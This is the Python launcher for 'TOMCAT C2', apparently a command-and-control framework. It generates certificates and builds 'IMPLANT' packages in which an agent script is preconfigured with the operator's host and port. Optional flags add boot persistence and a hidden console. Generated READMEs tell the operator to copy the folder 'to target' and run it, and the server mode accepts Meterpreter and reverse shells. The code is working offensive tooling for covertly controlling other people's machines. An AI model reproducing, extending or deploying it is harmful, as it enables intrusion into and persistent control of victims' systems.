#!/usr/bin/python3
# TOMCAT C2 Frameworks
# Author: TOM7
# GitHub: tom7voldemort

"""
[+] NOTE:
    -- Copying without owner permission is illegal.
    -- If you want to expand this project, ask owner for collaboration instead.

    Thanks for understanding.
    ~TOM7
"""

import os
import sys
import argparse
from Cores.Systems.System import StrObject
from Config.Color import TMColor
from Config.Logo import AUTHBanner, TBanner
from Config.Helper import Helper


def InitCertificates(Host="0.0.0.0"):
    try:
        from Cores.Systems.CertificateManager import CertificateManager

        StrObject.Messages(f"Initializing MTLS Certificate Infrastructure")
        CertManager = CertificateManager()
        CertManager.Initialize(Host)
        StrObject.Messages(f"Certificate Infrastructure Ready!")
        StrObject.Messages(f"Certificates Stored In: {CertManager.CertsDir}")
        StrObject.Messages(f"Files created:")
        StrObject.Messages(
            f"{TMColor.brightGreen}- {CertManager.CAKeyPath} (CA Private Key)"
        )
        StrObject.Messages(
            f"{TMColor.brightGreen}- {CertManager.CACertPath} (CA Certificate)"
        )
        StrObject.Messages(
            f"{TMColor.brightGreen}- {CertManager.ServerKeyPath} (Server Key)"
        )
        StrObject.Messages(
            f"{TMColor.brightGreen}- {CertManager.ServerCertPath} (Server Cert)"
        )
        StrObject.Messages(f"Next Steps:")
        StrObject.Messages("   1. Generate agent certificates:")
        StrObject.Messages("       python3 start.py -a <agent-id>")
        StrObject.Messages("   2. Start server with MTLS:")
        StrObject.Messages("       python3 start.py --mtls")
    except ImportError:
        StrObject.Warnings(
            "Missing Modules: cryptography. Install With: pip install cryptography"
        )
    except Exception as e:
        StrObject.Error(e)


def GenerateAgentCert(
    AgentID,
    UseRawName=False,
    ServerHost="0.0.0.0",
    ServerPort=4444,
    UseMTLS=False,
    AddPersistence=False,
    HideConsole=False,
):
    try:
        from Cores.Systems.CertificateManager import CertificateManager
        import shutil

        StrObject.Messages(f"Generating Agent Certificate: {AgentID}")
        CertManager = CertificateManager()
        if not os.path.exists(CertManager.CACertPath):
            StrObject.Warnings(f"CA Not Found. Run: python3 start.py --init-certs")
            return
        ClientKeyPath, ClientCertPath, CACertPath = CertManager.CreateClientCertificate(
            AgentID, UseRawName=UseRawName
        )
        AgentName = AgentID if UseRawName else f"agent-{AgentID}"
        DeployDir = f"IMPLANT/{AgentName.upper()}"
        os.makedirs(DeployDir, exist_ok=True)
        shutil.copy(ClientKeyPath, os.path.join(DeployDir, "agent-key.pem"))
        shutil.copy(ClientCertPath, os.path.join(DeployDir, "agent-cert.pem"))
        shutil.copy(CACertPath, os.path.join(DeployDir, "ca-cert.pem"))
        AgentScriptPath = os.path.join(DeployDir, "tomcatv2a.py")
        shutil.copy("AGENT/tomcatv2a.py", AgentScriptPath)
        ConfigureAgentScript(
            AgentScriptPath,
            ServerHost,
            ServerPort,
            UseMTLS,
            AddPersistence,
            HideConsole,
        )
        with open(os.path.join(DeployDir, "README.txt"), "w") as f:
            f.write(f"TOMCAT C2 Agent - {AgentName}")
            f.write("Configuration:")
            f.write(f"- Server Host: {ServerHost}")
            f.write(f"- Server Port: {ServerPort}")
            f.write(f"- MTLS Mode: {'ENABLED' if UseMTLS else 'DISABLED'}")
            f.write(f"- Persistence: {'ENABLED' if AddPersistence else 'DISABLED'}")
            f.write(f"- Hide Console: {'ENABLED' if HideConsole else 'DISABLED'}")
            f.write("Files:")
            f.write("- agent-key.pem     (Keep Secure!)")
            f.write("- agent-cert.pem    (Certificate)")
            f.write("- ca-cert.pem       (CA Certificate)")
            f.write("- tomcatv2a.py      (Agent Script - Pre-configured)")
            f.write("Deploy:")
            f.write("1. Copy entire folder to target")
            f.write("2. Run: python3 tomcatv2a.py")
            f.write("Security:")
            if UseMTLS:
                f.write("- MTLS enabled for secure communication")
                f.write("- Only authorized agents can connect")
            else:
                f.write("- WARNING: MTLS disabled (plain TCP)")
                f.write("- Enable with --agent-mtls flag")
            f.write("- Certificate expires in 365 days")
            if AddPersistence:
                f.write("Persistence Mode Enabled")
                f.write("The Agent Will Auto-Start On System Boot.")
                f.write("Registry/Startup Folder Method Base On OS.")
            if HideConsole:
                f.write("Hide Console Mode Activated.")
                f.write("Console Window Will Be Hidden On Execution.")
        StrObject.Messages(f"Agent Certificate Generated!")
        StrObject.Messages(f"Deployment Package: {DeployDir}")
        StrObject.Messages(f"Server: {ServerHost}:{ServerPort}")
        StrObject.Messages(f"MTLS: {'ENABLED' if UseMTLS else 'DISABLED'}")
        StrObject.Messages(
            f"Persistence: {'ENABLED' if AddPersistence else 'DISABLED'}"
        )
        StrObject.Messages(
            f"Hide Process Console: {'ENABLED' if HideConsole else 'DISABLED'}"
        )
        StrObject.Messages(f"Agent Is Pre-Configured And Ready To Deploy")
    except ImportError:
        StrObject.Warnings(
            "Missing Modules: cryptography. Install With: pip install cryptography"
        )
    except Exception as e:
        StrObject.Error(e)


def ConfigureAgentScript(
    ScriptPath, ServerHost, ServerPort, UseMTLS, AddPersistence=False, HideConsole=False
):
    with open(ScriptPath, "r") as f:
        Content = f.read()
    Content = Content.replace('ServerHost = "0.0.0.0"', f'ServerHost = "{ServerHost}"')
    Content = Content.replace("ServerPort = 4444", f"ServerPort = {ServerPort}")
    Content = Content.replace("UseMTLS = False", f"UseMTLS = {UseMTLS}")
    Content = Content.replace("UseMTLS = True", f"UseMTLS = {UseMTLS}")
    if "AddPersistence" in Content:
        Content = Content.replace(
            "AddPersistence = False", f"AddPersistence = {AddPersistence}"
        )
        Content = Content.replace(
            "AddPersistence = True", f"AddPersistence = {AddPersistence}"
        )
    if "HideConsole" in Content:
        Content = Content.replace("HideConsole = False", f"HideConsole = {HideConsole}")
        Content = Content.replace("HideConsole = True", f"HideConsole = {HideConsole}")
    with open(ScriptPath, "w") as f:
        f.write(Content)


def GenerateMultipleAgents(
    Count,
    Prefix="Agent",
    ServerHost="0.0.0.0",
    ServerPort=4444,
    UseMTLS=False,
    AddPersistence=False,
    HideConsole=False,
):
    try:
        from Cores.Systems.CertificateManager import CertificateManager
        import shutil

        StrObject.Messages(f"Generating {Count} Agent Certificates")
        CertManager = CertificateManager()
        if not os.path.exists(CertManager.CACertPath):
            StrObject.Warnings(f"CA Not Found. Run: python3 start.py --init-certs")
            return
        SuccessCount = 0
        for i in range(1, Count + 1):
            try:
                AgentName = f"{Prefix}-{i:03d}"
                StrObject.Messages(f"[{i}/{Count}] Generating: {AgentName}")
                ClientKeyPath, ClientCertPath, CACertPath = (
                    CertManager.CreateClientCertificate(AgentName, UseRawName=True)
                )
                DeployDir = f"IMPLANT/{AgentName.upper()}"
                os.makedirs(DeployDir, exist_ok=True)
                shutil.copy(ClientKeyPath, os.path.join(DeployDir, "agent-key.pem"))
                shutil.copy(ClientCertPath, os.path.join(DeployDir, "agent-cert.pem"))
                shutil.copy(CACertPath, os.path.join(DeployDir, "ca-cert.pem"))
                AgentScriptPath = os.path.join(DeployDir, "tomcatv2a.py")
                shutil.copy("AGENT/tomcatv2a.py", AgentScriptPath)
                ConfigureAgentScript(
                    AgentScriptPath,
                    ServerHost,
                    ServerPort,
                    UseMTLS,
                    AddPersistence,
                    HideConsole,
                )
                with open(os.path.join(DeployDir, "README.txt"), "w") as f:
                    f.write(f"TOMCAT C2 Agent - {AgentName}")
                    f.write(f"Agent ID: {AgentName}")
                    f.write(f"Certificate: {AgentName}-cert.pem")
                    f.write("Configuration:")
                    f.write(f"- Server Host: {ServerHost}")
                    f.write(f"- Server Port: {ServerPort}")
                    f.write(f"- MTLS Mode: {'ENABLED' if UseMTLS else 'DISABLED'}")
                    f.write(
                        f"- Persistence: {'ENABLED' if AddPersistence else 'DISABLED'}"
                    )
                    f.write(
                        f"- Hide Console: {'ENABLED' if HideConsole else 'DISABLED'}"
                    )
                    f.write("Files:")
                    f.write("- agent-key.pem     (Keep Secure!)")
                    f.write("- agent-cert.pem    (Certificate)")
                    f.write("- ca-cert.pem       (CA Certificate)")
                    f.write("- tomcatv2a.py      (Agent Script - Pre-configured)")
                    f.write("Deploy:")
                    f.write("1. Copy entire folder to target")
                    f.write("2. Run: python3 tomcatv2a.py")
                    f.write("Security:")
                    if UseMTLS:
                        f.write("- MTLS enabled for secure communication")
                        f.write("- Only authorized agents can connect")
                    else:
                        f.write("- WARNING: MTLS disabled (plain TCP)")
                        f.write("- Enable with --agent-mtls flag")
                    f.write("- Certificate expires in 365 days")
                    if AddPersistence:
                        f.write("Persistence Mode Enabled")
                        f.write("The Agent Will Auto-Start On System Boot.")
                        f.write("Registry/Startup Folder Method Base On OS.")
                    if HideConsole:
                        f.write("Hide Console Mode Activated.")
                        f.write("Console Window Will Be Hidden On Execution.")
                SuccessCount += 1
            except Exception as e:
                StrObject.Error(f"Error Will Generating {AgentName}: {e}")
                continue
        StrObject.Messages(f"Generated {SuccessCount}/{Count} Agents Successfully!")
        StrObject.Messages(f"Deployment Packages: IMPLANT/")
        StrObject.Messages(f"Server: {ServerHost}:{ServerPort}")
        StrObject.Messages(f"MTLS: {'ENABLED' if UseMTLS else 'DISABLED'}")
        StrObject.Messages(
            f"Persistence: {'ENABLED' if AddPersistence else 'DISABLED'}"
        )
        StrObject.Messages(
            f"Hide Process Console: {'ENABLED' if HideConsole else 'DISABLED'}"
        )
        StrObject.Messages(f"Agent Is Pre-Configured And Ready To Deploy")
    except ImportError:
        StrObject.Warnings(
            "Missing Modules: cryptography. Install With: pip install cryptography"
        )
    except Exception as e:
        StrObject.Error(e)


def ListAgents():
    try:
        from Cores.Systems.CertificateManager import CertificateManager

        CertManager = CertificateManager()
        Clients = CertManager.ListClients()
        StrObject.Messages(f"Agent Certificates")
        if not Clients:
            StrObject.Warnings(f"No Agents Generated Yet")
            StrObject.Messages(f"Generate with: python3 start.py -a <agent id>")
        else:
            StrObject.Messages(f"Total Agents: {len(Clients)}")
            for Name, Info in Clients.items():
                StrObject.Messages(f"{TMColor.brightGreen} Agent   : {Name}")
                StrObject.Messages(f"{TMColor.brightGreen} Created : {Info['Created']}")
                StrObject.Messages(
                    f"{TMColor.brightGreen} Valid   : {Info['ValidDays']} Days{TMColor.reset}\n",
                )
    except ImportError:
        StrObject.Warnings(
            "Missing Modules: cryptography. Install With: pip install cryptography"
        )
    except Exception as e:
        StrObject.Error(e)


def RevokeAgent(AgentID):
    try:
        from Cores.Systems.CertificateManager import CertificateManager

        CertManager = CertificateManager()
        AgentName = f"Agent-{AgentID}"
        StrObject.Messages(f"[*] Revoking Agent: {AgentName}")
        CertManager.RevokeClient(AgentName)
        StrObject.Messages(f"Agent Revoked Successfully!")
        StrObject.Messages(f"{AgentName} Can No Longer Connect")
    except ImportError:
        StrObject.Warnings(
            "Missing Modules: cryptography. Install With: pip install cryptography"
        )
    except Exception as e:
        StrObject.Error(e)


def StartGUI(
    Host="0.0.0.0", Port=5000, UseMTLS=False, MeterpreterMode=False, Mode="web"
):
    TBanner.Logo()
    if MeterpreterMode:
        StrObject.Messages(f"MODE: METERPRETER/MULTI-PROTOCOL")
        StrObject.Messages(f"Accepts: TOMCAT, Meterpreter, Reverse Shells")
    if UseMTLS:
        StrObject.Messages(f"MTLS: ENABLED")
        if not os.path.exists("Certs/server-cert.pem"):
            StrObject.Warnings(f"MTLS Certificates Not Found!")
            StrObject.Warnings(f"Run: python3 start.py --init-certs")
            sys.exit(1)
    else:
        StrObject.Warnings(f"MTLS: DISABLED (Plain TCP)")
        if not MeterpreterMode:
            StrObject.Warnings(f"Connections Not Authenticated")
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "Cores", "App"))
        from Cores.App.App import TOMCATC2GUI

        os.environ["TOMCAT_USE_MTLS"] = "1" if UseMTLS else "0"
        os.environ["TOMCAT_METERPRETER_MODE"] = "1" if MeterpreterMode else "0"
        if Mode == "cli":
            from Cores.App.Cli import TOMCATC2CLI

            StrObject.Messages(f"INTERFACE: CLI MODE")
            CLI = TOMCATC2CLI()
            CLI.Run(
                Host=Host,
                Port=Port,
                UseMTLS=UseMTLS,
                MeterpreterMode=MeterpreterMode,
            )
        elif Mode == "gui":
            from Cores.App.Gui import TOMCATC2GUI

            StrObject.Messages(f"INTERFACE: TKINTER GUI")
            GUI = TOMCATC2GUI()
            GUI.Run(
                Host=Host,
                Port=Port,
                UseMTLS=UseMTLS,
                MeterpreterMode=MeterpreterMode,
            )
        else:
            from Cores.App.App import TOMCATC2GUI

            StrObject.Messages(f"INTERFACE: WEB PANEL (Flask)")
            GUI = TOMCATC2GUI()
            GUI.Run(Host=Host, Port=Port)
    except KeyboardInterrupt:
        StrObject.Warnings(f"Server Stopped By User")
    except Exception as e:
        StrObject.Error(e)


def Main():
    Parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=Helper,
        add_help=False,
    )
    Parser.add_argument("-h", "--help", action="help")
    Parser.add_argument("-i", "--init-certs", action="store_true")
    Parser.add_argument("-S", "--host", default="0.0.0.0")
    Parser.add_argument("-p", "--port", type=int, default=5000)
    Parser.add_argument("-T", "--mtls", action="store_true")
    Parser.add_argument("-M", "--meterpreter", action="store_true")
    Parser.add_argument("-ah", "--agent-host", default="0.0.0.0")
    Parser.add_argument("-ap", "--agent-port", type=int, default=4444)
    Parser.add_argument("-am", "--agent-mtls", action="store_true")
    Parser.add_argument("-a", "--gen-agent", metavar="ID")
    Parser.add_argument("-m", "--gen-multi-agent", action="store_true")
    Parser.add_argument("-c", "--gen-agent-count", type=int, default=10)
    Parser.add_argument("-u", "--gen-agent-prefix", default="agent")
    Parser.add_argument("-l", "--list-agents", action="store_true")
    Parser.add_argument("-r", "--revoke-agent", metavar="ID")
    Parser.add_argument("-hc", "--hide-console", action="store_true")
    Parser.add_argument("-ps", "--persistence", action="store_true")
    Parser.add_argument("-W", "--web-mode", action="store_true", help="WEB Panel Mode.")
    Parser.add_argument("-C", "--cli-mode", action="store_true", help="CLI Panel Mode.")
    Parser.add_argument("-G", "--gui-mode", action="store_true", help="GUI Panel Mode")

    Args = Parser.parse_args()
    if Args.init_certs:
        StrObject.Clear()
        TBanner.Logo()
        AUTHBanner.Logo()
        InitCertificates(Args.host)
    elif Args.gen_agent:
        StrObject.Clear()
        TBanner.Logo()
        AUTHBanner.Logo()
        GenerateAgentCert(
            Args.gen_agent,
            UseRawName=True,
            ServerHost=Args.agent_host,
            ServerPort=Args.agent_port,
            UseMTLS=Args.agent_mtls,
            AddPersistence=Args.persistence,
            HideConsole=Args.hide_console,
        )
    elif Args.gen_multi_agent:
        StrObject.Clear()
        TBanner.Logo()
        AUTHBanner.Logo()
        GenerateMultipleAgents(
            Args.gen_agent_count,
            Args.gen_agent_prefix,
            ServerHost=Args.agent_host,
            ServerPort=Args.agent_port,
            UseMTLS=Args.agent_mtls,
            AddPersistence=Args.persistence,
            HideConsole=Args.hide_console,
        )
    elif Args.list_agents:
        StrObject.Clear()
        TBanner.Logo()
        AUTHBanner.Logo()
        ListAgents()
    elif Args.revoke_agent:
        StrObject.Clear()
        TBanner.Logo()
        AUTHBanner.Logo()
        RevokeAgent(Args.revoke_agent)
    else:
        StrObject.Clear()
        Mode = "web"
        if Args.cli_mode:
            Mode = "cli"
        elif Args.gui_mode:
            Mode = "gui"
        elif Args.web_mode:
            Mode = "web"
        StartGUI(Args.host, Args.port, Args.mtls, Args.meterpreter, Mode)


if __name__ == "__main__":
    Main()
